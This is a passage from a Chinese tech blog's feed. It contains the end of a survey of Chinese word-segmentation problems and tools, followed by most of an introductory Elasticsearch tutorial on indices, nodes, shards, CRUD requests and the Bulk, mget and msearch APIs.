title="分词器目前存在的问题"></a>分词器目前存在的问题</h3><p>目前中文分词难点主要有三个：</p><ul><li>分词标准：比如人名，在哈工大的标准中姓和名是分开的，但是在Hanlp中是合在一起的，这需要根据不同的需求制定不同的分词标准。</li><li>歧义：对于同一个待切分字符串存在多个分词结果。歧义又分为组合歧义，交集型歧义和真歧义三种分类。<ul><li>组合型歧义：分词是有不同的粒度的，指某个词条中的一部分也可以切分未一个独立的词条，比如“中华人民共和国”，粗粒度的分词就是“中华人民共和国”，细粒度的分词可能是<code>中华/人民/共和国</code></li><li>交集型歧义：在<code>郑州天和服装厂</code>中，<code>天和</code>是厂名，是一个专有名词，<code>和服</code>也是一个词，它们共用了<code>和</code>字</li><li>真歧义：本身的语法和语义都没有问题，即便采用人工切分也会产生同样的歧义，只有通过上下文的语义环境才能给出正确的切分结果，例如：对于句子<code>美国会通过对台售武法案</code>，既可以切分成<code>美国/会/通过台售武法案</code>也可以切分成<code>美/国会/通过台售武法案</code>。</li></ul></li><li>新词：也称未被词典收录的词，该问题的解决依赖于人们对分词技术和汉语语言结构进一步认识。</li></ul><p>一般在搜索引擎中,构建索引时和查询时会使用不同的分词算法，常用的方案是，在索引的时候，使用细粒度的分词以保证召回，在查询的时候使用粗粒度的分词以保证精度。</p><h2 id="分词工具介绍"><a href="#分词工具介绍" class="headerlink" title="分词工具介绍"></a>分词工具介绍</h2><ul><li>中科院计算所<a href="http://ictclas.nlpir.org/nlpir/html/jianjie-0.html" target="_blank" rel="noopener">NLPIR</a>：NLPIR能够全方位多角度满足应用者对大数据文本的处理需求，包括大数据完整的技术链条：网络抓取、正文提取、中英文分词、词性标注、实体抽取、词频统计、关键词提取、语义信息抽取、文本分类、情感分析、语义深度扩展、繁简编码转换、自动注音、文本聚类等。<br>NLPIR所有功能模块全部备有对应的二次开发接口（动态链接库.dll，.so，及静态链接库等形式），平台的各个中间件API可以无缝地融合到客户的各类复杂应用系统之中，可兼容Windows，Linux， Android，Maemo5, FreeBSD，麒麟等不同操作系统，开发者可使用Java，C/C++，C#, Python，Php, R等各类主流开发语言调用其所有功能。</li><li>哈工大的<a href="https://github.com/HIT-SCIR/ltp" target="_blank" rel="noopener">LTP</a>：语言技术平台（Language Technology Platform，LTP）是哈工大社会计算与信息检索研究中心历时十年开发的一整套中文语言处理系统。LTP制定了基于XML的语言处理结果表示，并在此基础上提供了一整套自底向上的丰富而且高效的中文语言处理模块（包括词法、句法、语义等6项中文处理核心技术），以及基于动态链接库（Dynamic Link Library, DLL）的应用程序接口、可视化工具，并且能够以网络服务（Web Service）的形式进行使用。</li><li><a href="https://github.com/NLPchina/ansj_seg" target="_blank" rel="noopener">ansj分词器</a>：这是一个基于n-Gram+CRF+HMM的中文分词的java实现；分词速度达到每秒钟大约200万字左右（mac air下测试），准确率能达到96%以上；目前实现了中文分词、 中文姓名识别 、 用户自定义词典、关键字提取、自动摘要、关键字标记等功能。可以应用到自然语言处理等方面,适用于对分词效果要求高的各种项目。</li><li>清华大学<a href="https://github.com/thunlp/THULAC" target="_blank" rel="noopener">THULAC</a>：THULAC（THU Lexical Analyzer for Chinese）由清华大学自然语言处理与社会人文计算实验室研制推出的一套中文词法分析工具包，具有中文分词和词性标注功能。THULAC具有如下几个特点：<ul><li>能力强。利用我们集成的目前世界上规模最大的人工分词和词性标注中文语料库（约含5800万字）训练而成，模型标注能力强大。</li><li>准确率高。该工具包在标准数据集Chinese Treebank（CTB5）上分词的F1值可达97.3％，词性标注的F1值可达到92.9％，与该数据集上最好方法效果相当。</li><li>速度较快。同时进行分词和词性标注速度为300KB/s，每秒可处理约15万字。只进行分词速度可达到1.3MB/s。</li></ul></li><li><a href="https://nlp.stanford.edu/software/segmenter.shtml：" target="_blank" rel="noopener">斯坦福分词器</a>：作为众多斯坦福自然语言处理中的一个包， Java实现的CRF算法。可以直接使用训练好的模型，也提供训练模型接口。</li><li><a href="https://github.com/hankcs/HanLP" target="_blank" rel="noopener">Hanlp分词器</a>：求解的是最短路径。优点：开源、有人维护、可以解答。原始模型用的训练语料是人民日报的语料，当然如果你有足够的语料也可以自己训练。</li><li><a href="https://github.com/yanyiwu/cppjieba" target="_blank" rel="noopener">结巴分词</a>：基于前缀词典实现高效的词图扫描，生成句子中汉字所有可能成词情况所构成的有向无环图 (DAG)；采用了动态规划查找最大概率路径, 找出基于词频的最大切分组合；对于未登录词，采用了基于汉字成词能力的 HMM 模型，使用了 Viterbi 算法。</li><li><a href="https://github.com/koth/kcws" target="_blank" rel="noopener">KCWS分词器(字嵌入+Bi-LSTM+CRF)</a>：本质上是序列标注，这个分词器用人民日报的80万语料，据说按照字符正确率评估标准能达到97.5%的准确率，各位感兴趣可以去看看。</li><li><a href="https://github.com/frcchang/zpar/releases" target="_blank" rel="noopener">ZPar</a>：新加坡科技设计大学开发的中文分词器，包括分词、词性标注和Parser，支持多语言，据说效果是公开的分词器中最好的，C++语言编写。</li><li><a href="https://github.com/wks/ik-analyzer" target="_blank" rel="noopener">IKAnalyzer</a>：IKAnalyzer是一个开源的，基于java的语言开发的轻量级的中文分词工具包。从2006年12月推出1.0版开始，IKAnalyzer已经推出了3个大版本。最初，它是以开源项目Luence为应用主体的，结合词典分词和文法分析算法的中文分词组件。新版本的IKAnalyzer3.0则发展为面向Java的公用分词组件，独立于Lucene项目，同时提供了对Lucene的默认优化实现。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.paddlepaddle.org.cn/tutorials/projectdetail/931981" target="_blank" rel="noopener">https://www.paddlepaddle.org.cn/tutorials/projectdetail/931981</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;人工智能、机器学习、深度学习、NLP 工具介绍。&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
  </entry>
  
  <entry>
    <title>重学 Elastic Stack 之 Elasticsearch 入门</title>
    <link href="https://xinlichao.cn/back-end/big-data/es-03/"/>
    <id>https://xinlichao.cn/back-end/big-data/es-03/</id>
    <published>2021-02-01T22:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.666Z</updated>
    
    <content type="html"><![CDATA[<p>Elasticsearch 是使用 Java 编写的一种开源搜索引擎，它在内部使用 Luence 做索引与搜索，通过对 Lucene 的封装，提供了一套简单一致的 RESTful API。</p><p>Elasticsearch 也是一种分布式的搜索引擎架构，可以很简单地扩展到上百个服务节点，并支持 PB 级别的数据查询，使系统具备高可用和高并发性。</p><p>本文介绍 Elasticsearch 基本概念和常用REST API。</p><a id="more"></a><h2 id="基本概念-索引、文档和REST-API"><a href="#基本概念-索引、文档和REST-API" class="headerlink" title="基本概念 - 索引、文档和REST API"></a>基本概念 - 索引、文档和REST API</h2><p><strong>Dev 视角</strong></p><ul><li>Index 索引<ul><li>Type 类型</li><li>Document 文档</li></ul></li></ul><p><strong>Ops 视角</strong></p><ul><li>Node 节点<ul><li>Shard 分片</li></ul></li></ul><p><img src="/images/big-data/es-03/1.jpg" alt="1"></p><h3 id="文档（Document）"><a href="#文档（Document）" class="headerlink" title="文档（Document）"></a>文档（Document）</h3><ul><li>Elasticsearch 是面向文档的，文档是所有可搜索数据的最小单位<ul><li>日志文件中的日志项</li><li>一本电影的具体信息 /一张唱片的详细信息</li><li>MP3 播放器里的一首歌 /一篇 PDF 文档中的具体内容</li></ul></li><li>文档会被序列化成 JSON格式，保存在 Elasticsearch 中<ul><li>JSON 对象由字段组成，</li><li>每个字段都有对应的字段类型（字符串/数值/布尔/日期/二进制/范围类型）</li></ul></li><li>每个文档都有一个 Unique ID。<ul><li>你可以自己指定 ID</li><li>或者通过 Elasticsearch 自动生成</li></ul></li></ul><h3 id="JSON-文档"><a href="#JSON-文档" class="headerlink" title="JSON 文档"></a>JSON 文档</h3><ul><li>一篇文档包含了一系列的字段。类似数据库表中一条记录</li><li>JSON 文档，格式灵活，不需要预先定义格式<ul><li>字段的类型可以指定或者通过 Elasticsearch 自动推算</li><li>支持数组 / 支持嵌套</li></ul></li></ul><p><img src="/images/big-data/es-03/2.jpg" alt="2"></p><h3 id="文档的元数据"><a href="#文档的元数据" class="headerlink" title="文档的元数据"></a>文档的元数据</h3><img src="/images/big-data/es-03/3.jpg" align="right" style="zoom:50%;" /><ul><li>元数据，用于标注文档的相关信息<ul><li>_index -文档所属的索引名</li><li>_type - 文档所属的类型名</li><li>_id -文档唯一 Id</li><li>_source∶ 文档的原始 Json 数据</li><li>_all∶ 整合所有字段内容到该字段，已被废除</li><li>_version∶ 文档的版本信息</li><li>_score∶ 相关性打分</li></ul></li></ul><!-- ![3][3] --><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><img src="/images/big-data/es-03/4.jpg" align="right" style="zoom:50%;" /><ul><li>Index-索引是文档的容器，是一类文档的结合<ul><li>Index 体现了逻辑空间的概念∶每个索引都有自己的 Mapping 定义，用于定义包含的文档的字段名和字段类型</li><li>Shard 体现了物理空间的概念∶索引中的数据分散在 Shard上</li></ul></li><li>索引的 Mapping 与 Settings<ul><li>Mapping 定义文档字段的类型</li><li>Setting 定义不同的数据分布</li></ul></li></ul><!-- ![4][4] --><h4 id="索引的不同语意"><a href="#索引的不同语意" class="headerlink" title="索引的不同语意"></a>索引的不同语意</h4><img src="/images/big-data/es-03/5.jpg" align="right" style="zoom:50%;" /><ul><li>名词：一个 Elasticsearch 集群中，可以创建很多个不同的索引</li><li>动词：保存一个文档到 Elasticsearch 的过程也叫索引(indexing)<ul><li>ES中，创建一个倒排索引的过程</li></ul></li><li>名词：一个 B 树索引，一个倒排索引</li></ul><!-- ![5][5] --><h3 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h3><ul><li>在 7.0 之前，一个索引 Index 可以设置多个 Types</li><li>6.0 开始，Type 已经被 Deprecated。7.0 开始，一个索引智能创建 一个 Type - “_doc”</li></ul><p><img src="/images/big-data/es-03/6.jpg" alt="6"></p><blockquote><p>使用类型的初衷是在与 Lucene 不兼容的单个索引中提供多租户，但遗憾的是，事实证明，类型带来的问题比解决的问题还多。<a href="https://www.elastic.co/cn/blog/moving-from-types-to-typeless-apis-in-elasticsearch-7-0" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/moving-from-types-to-typeless-apis-in-elasticsearch-7-0</a></p></blockquote><h3 id="抽象与类比"><a href="#抽象与类比" class="headerlink" title="抽象与类比"></a>抽象与类比</h3><table><thead><tr><th align="center">RDBMS</th><th align="center">Elasticsearch</th></tr></thead><tbody><tr><td align="center">Table</td><td align="center">Index(Type)</td></tr><tr><td align="center">Row</td><td align="center">Document</td></tr><tr><td align="center">Column</td><td align="center">Filed</td></tr><tr><td align="center">Schema</td><td align="center">Mapping</td></tr><tr><td align="center">SQL</td><td align="center">DSL</td></tr></tbody></table><p>传统关系型数据库和 Elasticsearch 的区别</p><ul><li>Elasticsearch - Schemaless / 相关性 / 高性能全文检索</li><li>RDBMS - 事务性 / Join</li></ul><h3 id="REST-API-很容易被各种语言调用"><a href="#REST-API-很容易被各种语言调用" class="headerlink" title="REST API - 很容易被各种语言调用"></a>REST API - 很容易被各种语言调用</h3><p><img src="/images/big-data/es-03/7.jpg" alt="7"></p><h2 id="基本概念-集群、节点、分片、副本"><a href="#基本概念-集群、节点、分片、副本" class="headerlink" title="基本概念 - 集群、节点、分片、副本"></a>基本概念 - 集群、节点、分片、副本</h2><h3 id="分布式系统的可用性与扩展性"><a href="#分布式系统的可用性与扩展性" class="headerlink" title="分布式系统的可用性与扩展性"></a>分布式系统的可用性与扩展性</h3><ul><li>高可用性<ul><li>服务可用性 - 允许有节点停止服务</li><li>数据可用性 - 部分节点丢失，不会丢失数据</li></ul></li><li>可扩展性<ul><li>请求量提升 / 数据的不断增长（将数据分布到所有节点上）</li></ul></li></ul><h3 id="分布式特性"><a href="#分布式特性" class="headerlink" title="分布式特性"></a>分布式特性</h3><ul><li>Elasticsearch 的分布式架构的好处<ul><li>存储的水平扩容</li><li>提高系统的可用性，部分节点停止服务，整个集群的服务不受影响</li></ul></li><li>Elasticsearch 的分布式架构<ul><li>不同的集群通过不同的名字来区分，默认名字”elasticsearch”</li><li>通过配置文件修改，或者在命令行中 <code>-E cluster.name=demo</code> 进行设定</li><li>一个集群可以有一个或者多个节点</li></ul></li></ul><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><ul><li>节点是一个 Elasticsearch 的实例<ul><li>本质上就是一个 JAVA 进程</li><li>一台机器上可以运行多个 Elasticsearch 进程，但是生产环境一般建议一台机器上只运行一个 Elasticsearch 实例</li></ul></li><li>每一个节点都有名字，通过配置文件配置，或者启动时候 <code>-Enode.name=node1</code> 指定</li><li>每一个节点在启动之后，会分配一个 UID，保存在 data 目录下</li></ul><h3 id="Master-eligible-nodes-和-Master-Node"><a href="#Master-eligible-nodes-和-Master-Node" class="headerlink" title="Master-eligible nodes 和 Master Node"></a>Master-eligible nodes 和 Master Node</h3><ul><li>每个节点启动后，默认就是一个 Master eligble 节点<ul><li>可以设置 <code>node.master∶ false</code> 禁止</li></ul></li><li>Master-eligible节点可以参加选主流程，成为 Master 节点</li><li>当第一个节点启动时候，它会将自己选举成 Master 节点</li><li>每个节点上都保存了集群的状态，只有 Master 节点才能修改集群的状态信息<ul><li>集群状态（Cluster State），维护了一个集群中，必要的信息<ul><li>所有的节点信息</li><li>所有的索引和其相关的 Mapping 与 Setting 信息</li><li>分片的路由信息</li></ul></li><li>任意节点都能修改信息会导致数据的不一致性</li></ul></li></ul><h3 id="Data-Node-amp-Coordinating-Node"><a href="#Data-Node-amp-Coordinating-Node" class="headerlink" title="Data Node &amp; Coordinating Node"></a>Data Node &amp; Coordinating Node</h3><ul><li>Data Node<ul><li>可以保存数据的节点，叫做 Data Node。负责保存分片数据。在数据扩展上起到了<br>至关重要的作用</li></ul></li><li>Coordinating Node<ul><li>负责接受Client的请求，将请求分发到合适的节点，最终把结果汇集到一起</li><li>每个节点默认都起到了 Coordinating Node的职责</li></ul></li></ul><h3 id="其他的节点类型"><a href="#其他的节点类型" class="headerlink" title="其他的节点类型"></a>其他的节点类型</h3><ul><li>Hot &amp; Warm Node<ul><li>不同硬件配置的 Data Node，用来实现 Hot &amp; Warm 架构，降低集群部署的成本</li></ul></li><li>Machine Learning Node<ul><li>负责跑 机器学习的 Job，用来做异常检测</li></ul></li><li>Tribe Node<ul><li>（5.3 开始使用 Cross Cluster Serarch）Tribe Node 连接到不同的 Elasticsearch集群，<br>并且支持将这些集群当成一个单独的集群处理</li></ul></li></ul><h3 id="配置节点类型"><a href="#配置节点类型" class="headerlink" title="配置节点类型"></a>配置节点类型</h3><ul><li>开发环境中一个节点可以承担多种角色</li><li>生产环境中，应该设置单一的角色的节点（dedicated node）</li></ul><table><thead><tr><th align="center">节点类型</th><th align="center">配置参数</th><th align="center">默认值</th></tr></thead><tbody><tr><td align="center">maste eligible</td><td align="center">node.master</td><td align="center">true</td></tr><tr><td align="center">data</td><td align="center">node.data</td><td align="center">true</td></tr><tr><td align="center">ingest</td><td align="center">node.ingest</td><td align="center">true</td></tr><tr><td align="center">coordinating only</td><td align="center">无</td><td align="center">每个节点默认都是 coordinating 节点。coordinating only 设置其他类型全部为false</td></tr><tr><td align="center">machine learning</td><td align="center">node.ml</td><td align="center">true（需enablex-pack）</td></tr></tbody></table><h3 id="分片（Primary-Shard-amp-Replica-Shard）"><a href="#分片（Primary-Shard-amp-Replica-Shard）" class="headerlink" title="分片（Primary Shard &amp; Replica Shard）"></a>分片（Primary Shard &amp; Replica Shard）</h3><ul><li>主分片，用以解决数据水平扩展的问题。通过主分片，可以将数据分布到集群内的所有节点之上<ul><li>一个分片是一个运行的 Lucene 的实例</li><li>主分片数在索引创建时指定，后续不允许修改，除非 Reindex</li></ul></li><li>副本，用以解决数据高可用的问题。分片是主分片的拷贝<ul><li>副本分片数，可以动态题调整</li><li>增加副本数，还可以在一定程度上提高服务的可用性（读取的吞吐）</li></ul></li><li>一个三节点的集群中，blogs 索引的分片分布情况<ul><li>思考：增加一个节点或改大主分片数对系统的影响？</li></ul></li></ul><p><img src="/images/big-data/es-03/8.jpg" alt="8"></p><h3 id="分片的设定"><a href="#分片的设定" class="headerlink" title="分片的设定"></a>分片的设定</h3><ul><li>对于生产环境中分片的设定，需要提前做好容量规划<ul><li>分片数设置过小<ul><li>导致后续无法增加节点实现水品扩展</li><li>单个分片的数据量太大，导致数据重新分配耗时</li></ul></li><li>分片数设置过大，7.0 开始，默认主分片设置成1，解决了over-sharding的问题<ul><li>影响搜索结果的相关性打分，影响统计结果的准确性</li><li>单个节点上过多的分片，会导致资源浪费，同时也会影响性能</li></ul></li></ul></li></ul><h3 id="ES-提供-API-，了解集群情况"><a href="#ES-提供-API-，了解集群情况" class="headerlink" title="ES 提供 API ，了解集群情况"></a>ES 提供 API ，了解集群情况</h3><ul><li>Green - 主分片跟副本都正常分配</li><li>Yellow - 主分片全部分配正常，有副本分片问能正常分配</li><li>Red - 有主分片未能分配<ul><li>例如：有磁盘容量超过 85% 时，去创建新的索引</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET _cluster/health //查看健康</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"cluster_name"</span> : <span class="string">"demo-cluster"</span>,</span><br><span class="line">  <span class="attr">"status"</span> : <span class="string">"green"</span>,</span><br><span class="line">  <span class="attr">"timed_out"</span> : <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"number_of_nodes"</span> : <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"number_of_data_nodes"</span> : <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"active_primary_shards"</span> : <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"active_shards"</span> : <span class="number">4</span>,</span><br><span class="line">  <span class="attr">"relocating_shards"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"initializing_shards"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"unassigned_shards"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"delayed_unassigned_shards"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"number_of_pending_tasks"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"number_of_in_flight_fetch"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"task_max_waiting_in_queue_millis"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"active_shards_percent_as_number"</span> : <span class="number">100.0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文档的基本-CRUD-与批量操作"><a href="#文档的基本-CRUD-与批量操作" class="headerlink" title="文档的基本 CRUD 与批量操作"></a>文档的基本 CRUD 与批量操作</h2><h3 id="文档的-CRUD-操作"><a href="#文档的-CRUD-操作" class="headerlink" title="文档的 CRUD 操作"></a>文档的 CRUD 操作</h3><table><thead><tr><th align="center">操作</th><th align="left">请求</th></tr></thead><tbody><tr><td align="center">Index</td><td align="left">PUT my_index/_doc/1 <br/> {“user”:”mike”,”comment”:”You know,for search”}</td></tr><tr><td align="center">Create</td><td align="left">PUT my_index/_create/1 <br/> {“user”:”mike”,”comment”:”You know,for search”} <br/> POST my_index/_doc (不指定ID，自动生成) <br/> {“user”:”mike”,”comment”:”You know,for search”}</td></tr><tr><td align="center">Read</td><td align="left">GET my_index/_doc/1</td></tr><tr><td align="center">Update</td><td align="left">POST my_index/_update/1 <br/> { “doc”: {“user”:”mike”,”comment”:”You know,Elasticsearch”}}</td></tr><tr><td align="center">Delete</td><td align="left">DELETE my_index/_doc/1</td></tr></tbody></table><ul><li>Type 名，约定都用 _doc</li><li>Create - 如果ID已经存在，会失败</li><li>Index - 如果ID不存在，创建新的文档。否则，先删除现有的文档，再创建新的文档，版本会增加</li><li>Update - 文档必须已经存在，更新只会对相应字段做增量修改</li></ul><h3 id="Bulk-API"><a href="#Bulk-API" class="headerlink" title="Bulk API"></a>Bulk API</h3><ul><li>支持在一次 API 调用中，对不同的索引进行操作</li><li>支持四种类型操作<ul><li>Index</li><li>Create</li><li>Update</li><li>Delete</li></ul></li><li>可以再 URI 中指定 Index，也可以在请求的 Payload中进行</li><li>操作中单条操作失败，并不会影响其他操作</li><li>返回结果包括了每一条操作执行的结果</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST _bulk</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123; <span class="attr">"_index"</span> : <span class="string">"test"</span>, <span class="attr">"_id"</span> : <span class="string">"1"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"field1"</span> : <span class="string">"value1"</span> &#125;</span><br><span class="line">&#123; <span class="attr">"delete"</span> : &#123; <span class="attr">"_index"</span> : <span class="string">"test"</span>, <span class="attr">"_id"</span> : <span class="string">"2"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"create"</span> : &#123; <span class="attr">"_index"</span> : <span class="string">"test2"</span>, <span class="attr">"_id"</span> : <span class="string">"3"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"field1"</span> : <span class="string">"value3"</span> &#125;</span><br><span class="line">&#123; <span class="attr">"update"</span> : &#123;<span class="attr">"_id"</span> : <span class="string">"1"</span>, <span class="attr">"_index"</span> : <span class="string">"test"</span>&#125; &#125;</span><br><span class="line">&#123; <span class="attr">"doc"</span> : &#123;<span class="attr">"field2"</span> : <span class="string">"value2"</span>&#125; &#125;</span><br></pre></td></tr></table></figure><h4 id="Bulk-请求体格式"><a href="#Bulk-请求体格式" class="headerlink" title="Bulk 请求体格式"></a>Bulk 请求体格式</h4><p><strong>Bulk 请求格式：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;"action": &#123;"meta"&#125;&#125;\n</span><br><span class="line">&#123;"data"&#125;\n</span><br><span class="line">&#123;"action": &#123;"meta"&#125;&#125;\n</span><br><span class="line">&#123;"data"&#125;\n</span><br></pre></td></tr></table></figure><p>为什么不使用标椎JOSN格式？</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"action"</span>:&#123;&#125;,</span><br><span class="line">    <span class="attr">"data"</span>:&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><blockquote><p>原因是与底层性能优化关系：bulk 中的每个操作都可能要转发到不同的 node 的 shard 去执行</p></blockquote><p><strong>ES处理标准格式JSON串的流程：</strong></p><p>使用良好的json数组格式，允许任意换行，可读性非常好，但是es拿到那种标准格式的json串以后，要按照下述流程去进行处理</p><ol><li>将json数组解析为JSONArray对象，这个时候，整个数据，就会在内存中出现一份一模一样的拷贝，一份数据是json文本，一份数据是JSONArray对象</li><li>解析json数组里的每个json，对每个请求中的document进行路由</li><li>为路由到同一个shard上的多个请求，创建一个请求数组</li><li>将这个请求数组序列化</li><li>将序列化后的请求数组发送到对应的节点上去</li></ol><p><strong>Bulk 使用标准格式JSON串的弊端：</strong></p><p>Bulk size最佳大小，一般建议说在几千条那样，然后大小在10MB左右，所以说，可怕的事情来了。假设说现在100个bulk请求发送到了一个节点上去，然后每个请求是10MB，100个请求，就是1000MB = 1GB，然后每个请求的json都copy一份为JsonArray对象，此时内存中的占用就会翻倍，就会占用2GB的内存，甚至还不止。因为弄成JsonArray之后，还可能会多搞一些其他的数据结构，2GB+的内存占用。</p><p>占用更多的内存可能就会积压其他请求的内存使用量，比如说最重要的搜索请求，分析请求，等等，此时就可能会导致其他请求的性能急速下降。</p><p>另外的话，占用内存更多，就会导致java虚拟机的垃圾回收次数更多，更频繁，每次要回收的垃圾对象更多，耗费的时间更多，导致es的java虚拟机停止工作线程的时间更多。</p><p><strong>Bulk 奇特格式的好处：</strong></p><ol><li>不用将其转换为json对象，不会出现内存中的相同数据的拷贝，直接按照换行符切割json</li><li>对每两个一组的json，读取meta，进行document路由</li><li>直接将对应的json发送到node上去</li><li>最大的优势在于，不需要将json数组解析为一个JSONArray对象，形成一份大数据的拷贝，浪费内存空间，尽可能地保证性能</li></ol><h4 id="Bulk-一次最大处理多少数据量"><a href="#Bulk-一次最大处理多少数据量" class="headerlink" title="Bulk 一次最大处理多少数据量"></a>Bulk 一次最大处理多少数据量</h4><p>bulk 会把将要处理的数据载入内存中，所以数据量是有限制的，最佳的数据量不是一个确定的数值，它取决于你的硬件，你的文档大小以及复杂性，你的索引以及搜索的负载.</p><p>一般建议是1000-5000个文档，如果你的文档很大，可以适当减少队列,大小建议是5-15MB，默认不能超过100M，可以在es的配置文件中修改这个值 <code>http.max_content_length: 100mb</code></p><h3 id="批量读取-mget"><a href="#批量读取-mget" class="headerlink" title="批量读取 - mget"></a>批量读取 - mget</h3><p>批量操作，可以减少网络连接所产生的开销，提高性能</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">GET /_mget</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"docs"</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span> : <span class="string">"user"</span>,</span><br><span class="line">      <span class="attr">"_id"</span> : <span class="string">"1"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span> : <span class="string">"user"</span>,</span><br><span class="line">      <span class="attr">"_id"</span> : <span class="string">"2"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span> : <span class="string">"comment"</span>,</span><br><span class="line">      <span class="attr">"_id"</span> : <span class="string">"1"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定索引</span></span><br><span class="line">GET /user/_mget</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"docs"</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_id"</span> : <span class="string">"1"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_id"</span> : <span class="string">"2"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="批量查询-msearch"><a href="#批量查询-msearch" class="headerlink" title="批量查询 - msearch"></a>批量查询 - msearch</h3><p>对不同的索引，进行不同的 search</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要通过 Kibana 导入Sample Data的电商数据</span></span><br><span class="line">POST kibana_sample_data_ecommerce/_msearch</span><br><span class="line">&#123;&#125;</span><br><span class="line">&#123;<span class="attr">"query"</span> : &#123;<span class="attr">"match_all"</span> : &#123;&#125;&#125;,<span class="attr">"size"</span>:<span class="number">1</span>&#125;</span><br><span class="line">&#123;<span class="attr">"index"</span> : <span class="string">"kibana_sample_data_flights"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"query"</span> : &#123;<span class="attr">"match_all"</span> : &#123;&#125;&#125;,<span class="attr">"size"</span>:<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="常见错误返回"><a href="#常见错误返回" class="headerlink" title="常见错误返回"></a>常见错误返回</h3><table><thead><tr><th align="center">问题</th><th align="center">原因</th></tr></thead><tbody><tr><td align="center">无法连接</td><td align="center">网络故障或者集群挂了</td></tr><tr><td align="center">连接无法关闭</td><td align="center">网络故障或者节点出错</td></tr><tr><td align="center">429</td><td align="center">集群过于繁忙（重试或者增加节点已增加吞吐量）</td></tr><tr><td align="center">4xx</td><td align="center">请求体格式有误</td></tr><tr><td align="center">500</td><td align="center">集群内部错误</td></tr></tbody></table><h2 id="ES-核心-全文检索"><a href="#ES-核心-全文检索" class="headerlink" title="ES 核心 - 全文检索"></a>ES 核心 - 